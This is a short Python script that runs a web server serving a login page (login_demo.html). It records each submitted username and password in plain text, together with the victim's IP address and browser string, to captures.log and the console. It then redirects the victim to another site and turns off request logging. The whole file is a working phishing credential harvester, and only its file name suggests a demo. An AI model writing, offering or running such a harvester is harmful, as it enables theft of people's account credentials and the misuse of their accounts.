
import http.server, urllib.parse, datetime
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(open("login_demo.html","rb").read())
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        data = urllib.parse.parse_qs(self.rfile.read(n).decode())
        line = f"{datetime.datetime.now()} IP={self.client_address[0]} UA={self.headers.get('User-Agent','')} id={data.get('u')} pw={data.get('p')}"
        open("captures.log","a").write(line + "\n"); print(line)
        self.send_response(302); self.send_header("Location","https://example.com"); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8081), H).serve_forever()
